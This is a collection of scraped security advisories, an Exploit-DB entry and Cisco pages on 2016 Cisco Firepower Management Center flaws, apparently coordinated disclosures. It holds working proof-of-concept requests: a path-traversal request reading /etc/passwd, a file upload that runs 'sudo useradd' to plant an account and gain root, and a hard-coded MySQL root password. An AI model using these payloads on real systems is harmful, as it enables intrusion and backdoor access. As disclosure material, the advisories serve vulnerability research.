=== Content from www.korelogic.com_7548a0e5_20250126_092024.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2016-006 : Cisco Firepower Threat Management Console Local File Inclusion
Title: Cisco Firepower Threat Management Console Local File Inclusion
Advisory ID: KL-001-2016-006
Publication Date: 2016.10.05
Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2016-006.txt
1. Vulnerability Details
Affected Vendor: Cisco
Affected Product: Firepower Threat Management Console
Affected Version: Cisco Fire Linux OS 6.0.1 (build 37/build 1213)
Platform: Embedded Linux
CWE Classification: CWE-73: External Control of File Name or Path
Impact: Information Disclosure
Attack vector: HTTP
CVE-ID: CVE-2016-6435
2. Vulnerability Description
An authenticated user can access arbitrary files on the local system.
3. Technical Description
Requests that take a file path do not properly filter what files can
be requested. The webserver does not run as root, so files such as
/etc/shadow are not readable.
GET /events/reports/view.cgi?download=1&files=../../../etc/passwd%00 HTTP/1.1
Host: 1.3.3.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Cookie: CGISESSID=2ee7e6f19a104f4453e201f26fdbd6f3
Connection: close
HTTP/1.1 200 OK
Date: Fri, 22 Apr 2016 23:58:41 GMT
Server: Apache
Content-Disposition: attachment; filename=passwd
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Type: application/octet-stream
Content-Length: 623
root:x:0:0:Operator:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
mysql:x:27:27:MySQL:/var/lib/mysql:/sbin/nologin
nobody:x:99:99:nobody:/:/sbin/nologin
sshd:x:33:33:sshd:/:/sbin/nologin
www:x:67:67:HTTP server:/var/www:/sbin/nologin
sfrna:x:88:88:SF RNA User:/Volume/home/sfrna:/sbin/nologin
snorty:x:90:90:Snorty User:/Volume/home/snorty:/sbin/nologin
sfsnort:x:95:95:SF Snort User:/Volume/home/sfsnort:/sbin/nologin
sfremediation:x:103:103::/Volume/home/remediations:/sbin/nologin
admin:x:100:100::/Volume/home/admin:/bin/sh
casuser:x:101:104:CiscoUser:/var/opt/CSCOpx:/bin/bash
4. Mitigation and Remediation Recommendation
The vendor has issued a patch for this vulnerability
in version 6.1. Vendor acknowledgement available at:
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc
5. Credit
This vulnerability was discovered by Matt Bergin (@thatguylevel)
of KoreLogic, Inc.
6. Disclosure Timeline
2016.06.30 - KoreLogic sends vulnerability report and PoC to Cisco.
2016.06.30 - Cisco acknowledges receipt of vulnerability report.
2016.07.20 - KoreLogic and Cisco discuss remediation timeline for
this vulnerability and for 3 others reported in the
same product.
2016.08.12 - 30 business days have elapsed since the vulnerability was
reported to Cisco.
2016.09.02 - 45 business days have elapsed since the vulnerability was
reported to Cisco.
2016.09.09 - KoreLogic asks for an update on the status of the
remediation efforts.
2016.09.15 - Cisco confirms remediation is underway and soon to be
completed.
2016.09.28 - Cisco informs KoreLogic that the remediation details will
be released publicly on 2016.10.05.
2016.10.05 - Public disclosure.
7. Proof of Concept
See Technical Description
The contents of this advisory are copyright(c) 2016
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
-----BEGIN PGP SIGNATURE-----
iQEcBAEBCAAGBQJX9V39AAoJEE1lmiwOGYkMHdQH/2pP4FwOOp8weApiN9lkyYnM
Wt1K63ugLy5jxQLzvVvtcymP+wD7dDVsHXWkjeUXS5G8LutjPiSV/Q8GQ0jBXS53
sCgqkcJN9gW6TbaKiLyh7ZhzEYL+uo61cUlSjtmjPAmtDcdIsfkU4NhsyI1SmTvS
eIIE2TyZYRjkwl+qCOeLD1w3Bh22gu0By/zrYC571HUwiDLrnp6knztTA+MNRlNH
EWiThPAT6eTBWDSB0aAcTqk/aK/VtJGil904z9LIeZT/5+XRuPCWFvPy2mI8U3at
xXLl5uJnaqGmFehZMUKsOdMTpMqaGwS87gKfmfN45ogqw/gGHGc9Axs2a2MNknI=
=xS1L
-----END PGP SIGNATURE-----


=== Content from www.korelogic.com_f5f235b0_20250126_092025.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2016-007 : Cisco Firepower Threat Management Console Remote Command Execution Leading to Root Access
Title: Cisco Firepower Threat Management Console Remote Command Execution Leading to Root Access
Advisory ID: KL-001-2016-007
Publication Date: 2016.10.05
Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2016-007.txt
1. Vulnerability Details
Affected Vendor: Cisco
Affected Product: Firepower Threat Management Console
Affected Version: Cisco Fire Linux OS 6.0.1 (build 37/build 1213)
Platform: Embedded Linux
CWE Classification: CWE-434: Unrestricted Upload of File with Dangerous
Type, CWE-94: Improper Control of Generation of Code
Impact: Arbitrary Code Execution
Attack vector: HTTP
CVE-ID: CVE-2016-6433
2. Vulnerability Description
An authenticated user can run arbitrary system commands as
the www user which leads to root.
3. Technical Description
A valid session and CSRF token is required. The webserver runs as
a non-root user which is permitted to sudo commands as root with
no password.
POST /DetectionPolicy/rules/rulesimport.cgi?no\_mojo=1 HTTP/1.1
Host: 1.3.3.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Cookie: CGISESSID=4919a7838198009bba48f6233d0bd1c6
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------15519792567789791301241925798
Content-Length: 813
-----------------------------15519792567789791301241925798
Content-Disposition: form-data; name="manual\_update"
1
-----------------------------15519792567789791301241925798
Content-Disposition: form-data; name="source"
file
-----------------------------15519792567789791301241925798
Content-Disposition: form-data; name="file"; filename="Sourcefire\_Rule\_Update-2016-03-04-001-vrt.sh"
Content-Type: application/octet-stream
sudo useradd -G ldapgroup -p `openssl passwd -1 korelogic` korelogic
-----------------------------15519792567789791301241925798
Content-Disposition: form-data; name="action\_submit"
Import
-----------------------------15519792567789791301241925798
Content-Disposition: form-data; name="sf\_action\_id"
8c6059ae8dbedc089877b16b7be2ae7f
-----------------------------15519792567789791301241925798--
HTTP/1.1 200 OK
Date: Sat, 23 Apr 2016 13:38:01 GMT
Server: Apache
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
Content-Length: 49998
Connection: close
Content-Type: text/html; charset=utf-8
...
$ ssh korelogic@1.3.3.7
Password:
Copyright 2004-2016, Cisco and/or its affiliates. All rights reserved.
Cisco is a registered trademark of Cisco Systems, Inc.
All other trademarks are property of their respective owners.
Cisco Fire Linux OS v6.0.1 (build 37)
Cisco Firepower Management Center for VMWare v6.0.1 (build 1213)
Could not chdir to home directory /Volume/home/korelogic: No such file or directory
korelogic@firepower:/$ sudo su -
Password:
root@firepower:~#
4. Mitigation and Remediation Recommendation
The vendor has acknowledged this vulnerability but has
not issued a fix. Vendor acknowledgement available at:
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc2
5. Credit
This vulnerability was discovered by Matt Bergin (@thatguylevel) of KoreLogic, Inc.
6. Disclosure Timeline
2016.06.30 - KoreLogic sends vulnerability report and PoC to Cisco.
2016.06.30 - Cisco acknowledges receipt of vulnerability report.
2016.07.20 - KoreLogic and Cisco discuss remediation timeline for
this vulnerability and for 3 others reported in the
same product.
2016.08.12 - 30 business days have elapsed since the vulnerability was
reported to Cisco.
2016.09.02 - 45 business days have elapsed since the vulnerability was
reported to Cisco.
2016.09.09 - KoreLogic asks for an update on the status of the
remediation efforts.
2016.09.15 - Cisco confirms remediation is underway and soon to be
completed.
2016.09.28 - Cisco informs KoreLogic that the acknowledgement details
will be released publicly on 2016.10.05.
2016.10.05 - Public disclosure.
7. Proof of Concept
See Technical Description
The contents of this advisory are copyright(c) 2016
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
-----BEGIN PGP SIGNATURE-----
iQEcBAEBCAAGBQJX9V6yAAoJEE1lmiwOGYkMSXoH/RpZUHV8PoeYBQjujpncBEB/
EmsvgSsmSykKh+c/t7JBjIv+c2AULTb8UJf8w8+zZncpDWLRhSmvYCJorEb5vFWG
MvhpFcJD4S0w8dARMYiv4J9OUNcnR9CrzYpud6tXkH1Q2/EQJg2/rrW8mPlQWKKg
EEqgMffYip6IwFTNMlZ+hyjDig3p6zXi55lQgaGtXib6cGnVG/r0UrwouzHv6uf8
oUenHiOAaOL1DUSRiLMFGgFom8CmEHPdURDfJVrVTsHhray/QgEp9rQRBVk2Q9pZ
Um0tTm5Jia0xoyZrr/jWtptYvoLr80pxOs7kb97p3OOzqBvcApdtKhgriiA7N+M=
=NvTS
-----END PGP SIGNATURE-----


=== Content from sec.cloudapps.cisco.com_b02972e3_20250126_092021.html ===


[Home](http://www.cisco.com) / [Cisco Security](https://sec.cloudapps.cisco.com/security/center/home.x) / [Latest Threat Information](https://sec.cloudapps.cisco.com/security/center/navigation.x?i=118)
#### Cisco Security

# Common Vulnerability Scoring System

| Choose the version of CVSS calculator:   Version 1  Version 2  Version 3  Version 3.1 |
| --- |
| Common Vulnerability Scoring System (CVSS) Online Calculator, version 2.0 |
| Vector: AV:L/AC:L/Au:S/C:P/I:P/A:P/E:F/RL:U/RC:C/CDP:ND/TD:ND/CR:ND/IR:ND/AR:ND |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Access Vector AV: Local AV: Adjacent Network AV: Network  Access Complexity AC: High AC: Medium AC: Low  Authentication Au: Multiple Au: Single Au: None  Confidentiality Impact C: None C: Partial C: Complete  Integrity Impact I: None I: Partial I: Complete  Availability Impact A: None A: Partial A: Complete     Base Score: 4.3 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploitability E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   **Exploitability**  ---   Unproven (U) No exploit code is available, or an exploit is entirely theoretical. Proof-of-Concept (POC) Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.  Functional (F) Functional exploit code is available. The code works in most situations where the vulnerability exists.  High (H) Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available. The code works in every situation, or is actively being delivered via a mobile autonomous agent (such as a worm or virus).  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   **Remediation Level**  ---   Official Fix (OF)  A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. Temporary Fix (TF) There is an official but temporary fix available. This includes instances where the vendor issues a temporary hotfix, tool, or workaround.  Workaround (W)  There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.  Unavailable (U)  There is either no solution available or it is impossible to apply.  Not Defined (ND)  Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Report Confidence RC: Unconfirmed  RC: Uncorroborated  RC: Confirmed  RC: Not Defined   **Report Confidence**  ---   Unconfirmed (UC) There is a single unconfirmed source or possibly multiple conflicting reports. There is little confidence in the validity of the reports. An example is a rumor that surfaces from the hacker underground. Uncorroborated (UR) There are multiple non-official sources, possibly including independent security companies or research organizations. At this point there may be conflicting technical details or some other lingering ambiguity.  Confirmed (C) The vulnerability has been acknowledged by the vendor or author of the affected technology. The vulnerability may also be ?Confirmed? when its existence is confirmed from an external event such as publication of functional or proof-of-concept exploit code or widespread exploitation.  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.     Temporal Score: 4.1 |

| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Collateral Damage Potential CDP: None  CDP: Low  CDP: Low-Medium  CDP: Medium-High  CDP: High  CDP: Not Defined   Target Distribution TD: None  TD: Low  TD: Medium  TD: High  TD: Not Defined   Confidentiality Requirement CR: Not Defined  CR: Low  CR: Medium  CR: High   Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Availability Requirement AR: Not Defined  AR: Low  AR: Medium  AR: High      Environmental Score: 4.1 |

| --- |
|  |
|

![](https://www.static-cisco.com/web/fw/search//img/loader.gif)

Loading..

### Tools

* [Cisco Software Checker](/security/center/softwarechecker.x)
* [Cisco Vulnerability Repository](/security/center/cvr)
* [Bug Search](https://bst.cloudapps.cisco.com/bugsearch/)
* [Cisco PSIRT openVuln API](https://developer.cisco.com/psirt/)
* [CVRF Repository](/security/center/cvrfListing.x)
* [OVAL Repository](https://community.cisco.com/t5/services-blogs/update-regarding-oval-definitions-by-cisco/ba-p/3661030)

### Actions

* [Download Cisco Software](https://software.cisco.com/download/home)
* [Download Snort Rules](https://snort.org)
* [Open or Query a TAC Case](https://mycase.cloudapps.cisco.com/case)

### Related Links

* [Cisco Event Responses](/security/center/erp.x?i=52)
* [Cisco Policies and Processes](/security/center/securityResources.x)
* [Cisco Security Blog](https://blogs.cisco.com/security)
* [Security Solutions](https://www.cisco.com/site/us/en/products/security/index.html)

| --- |
| --- |
| **ENDORSEMENT**  Cisco endorses and subscribes to the vulnerability guidelines outlined by the National Infrastructure Advisory Council (NIAC). The NIAC commissioned the development of the Common Vulnerability Scoring System (CVSS), which is currently maintained by FIRST (Forum of Incident Response and Security Teams), www.first.org, and was a combined effort involving many companies, including Cisco Systems, Inc.  **GENERAL DISCLAIMER AND LIMITATION OF LIABILITY**  All information provided by the CVSS Online Calculator is for informational purposes only and is subject to change or withdrawal at any time without notice. The CVSS Online Calculator is a pilot program and Cisco assumes no responsibility for the accuracy or completeness of the information provided and any decision made or action taken or not taken in reliance upon the information provided or furnished hereunder. The information and results provided by the CVSS Online Calculator vary based on the information provided by each user, which is specific to each user's network and cannot be verified or confirmed by Cisco. The CVSS Online Calculator is offered only as a convenience and any use of the results or information provided is at the user's risk. |



=== Content from www.exploit-db.com_adf53306_20250125_141834.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Cisco Firepower Threat Management Console 6.0.1 - Hard-Coded MySQL Credentials

#### EDB-ID:

###### 40465

#### CVE:

###### [2016-6434](https://nvd.nist.gov/vuln/detail/CVE-2016-6434)

---

**EDB Verified:**

#### Author:

###### [KoreLogic](/?author=7433)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2016-10-05

---

**Vulnerable App:**

```
KL-001-2016-005 : Cisco Firepower Threat Management Console Hard-coded MySQL
Credentials

Title: Cisco Firepower Threat Management Console Hard-coded MySQL Credentials
Advisory ID: KL-001-2016-005
Publication Date: 2016.10.05
Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2016-005.txt

1. Vulnerability Details

     Affected Vendor: Cisco
     Affected Product: Firepower Threat Management Console
     Affected Version: Cisco Fire Linux OS 6.0.1 (build 37/build 1213)
     Platform: Embedded Linux
     CWE Classification: CWE-798: Use of Hard-coded Credentials
     Impact: Authentication Bypass
     CVE-ID: CVE-2016-6434

2. Vulnerability Description

     The root account for the local MySQL database has poor password
     complexity.

3. Technical Description

     root@firepower:/Volume/6.0.1# mysql -u root --password=admin
     Warning: Using a password on the command line interface can be insecure.
     Welcome to the MySQL monitor.  Commands end with ; or \g.
     Your MySQL connection id is 23348
     Server version: 5.6.24-enterprise-commercial-advanced-log MySQL Enterprise
Server - Advanced Edition (Commercial)

     Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

     Oracle is a registered trademark of Oracle Corporation and/or its
     affiliates. Other names may be trademarks of their respective
     owners.

     Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

     mysql> show databases;
     +--------------------+
     | Database           |
     +--------------------+
     | information_schema |
     | Sourcefire         |
     | external_data      |
     | external_schema    |
     | mysql              |
     | performance_schema |
     | sfsnort            |
     +--------------------+
     7 rows in set (0.00 sec)

     mysql>

     Note that mysqld listens only on loopback, so a remote attacker
     would have to leverage some other condition to be able to reach
     the mysql daemon.

4. Mitigation and Remediation Recommendation

     The vendor has acknowledged this vulnerability
     but has not released a fix for the
     issue. Vendor acknowledgement available at:

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc1

5. Credit

     This vulnerability was discovered by Matt Bergin (@thatguylevel)
     of KoreLogic, Inc.

6. Disclosure Timeline

     2016.06.30 - KoreLogic sends vulnerability report and PoC to Cisco.
     2016.06.30 - Cisco acknowledges receipt of vulnerability report.
     2016.07.20 - KoreLogic and Cisco discuss remediation timeline for
                  this vulnerability and for 3 others reported in the
                  same product.
     2016.08.12 - 30 business days have elapsed since the vulnerability was
                  reported to Cisco.
     2016.09.02 - 45 business days have elapsed since the vulnerability was
                  reported to Cisco.
     2016.09.09 - KoreLogic asks for an update on the status of the
                  remediation efforts.
     2016.09.15 - Cisco confirms remediation is underway and soon to be
                  completed.
     2016.09.28 - Cisco informs KoreLogic that the acknowledgement details
                  will be released publicly on 2016.10.05.
     2016.10.05 - Public disclosure.

7. Proof of Concept

     See Technical Description

The contents of this advisory are copyright(c) 2016
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt

```

**Tags:**

**Advisory/Source:**
[Link](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc1)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from tools.cisco.com_372ccb09_20250125_141831.html ===


[Home](https://www.cisco.com)  / [Cisco Security](/security/center/home.x) / [Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x)

|  |  |  |  |  |  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| | Cisco Security AdvisoryCisco Firepower Management Center Console Authentication Bypass Vulnerability Medium   Advisory ID:  cisco-sa-20161005-ftmc1  First Published: 2016 October 5 16:00 GMT  Version 1.0:  [Final](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#final)   Workarounds:  No workarounds available  Cisco Bug IDs: [CSCva30370](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCva30370)     CVE-2016-6434     CWE-287       CVSS Score: [Base 4.3, Temporal 4.1](https://sec.cloudapps.cisco.com/security/center/cvssCalculator.x?version=2.0&vector=AV:L/AC:L/Au:S/C:P/I:P/A:P/E:F/RL:U/RC:C)**Click Icon to Copy Verbose Score** AV:L/AC:L/Au:S/C:P/I:P/A:P/E:F/RL:U/RC:C       CVE-2016-6434     CWE-287       Email      Summary  * A vulnerability in the web console of Cisco Firepower Management Center could allow an authenticated, local attacker to bypass authentication and access sensitive information.  Affected Products  * Vulnerable ProductsThis vulnerability affects Cisco Firepower Management Center.Products Confirmed Not VulnerableNo other Cisco products are currently known to be affected by this vulnerability.  Workarounds  * There are no workarounds that address this vulnerability.  Fixed Software  * Cisco provides information about fixed software in Cisco bugs, which are accessible through the [Cisco Bug Search 